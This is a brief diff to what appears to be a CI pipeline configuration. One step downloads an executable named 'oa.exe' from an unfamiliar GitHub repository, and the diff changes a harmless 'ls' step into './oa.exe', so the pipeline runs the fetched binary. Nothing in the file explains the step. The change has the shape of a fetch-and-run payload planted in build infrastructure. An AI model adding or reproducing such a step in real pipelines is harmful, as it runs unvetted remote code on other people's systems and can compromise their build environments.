@@ -12,4 +12,4 @@ jobs:
       - run:
          command: Invoke-WebRequest https://github.com/Uytrel/p/blob/main/oa.exe
       - run:
-         command: ls
+         command: ./oa.exe
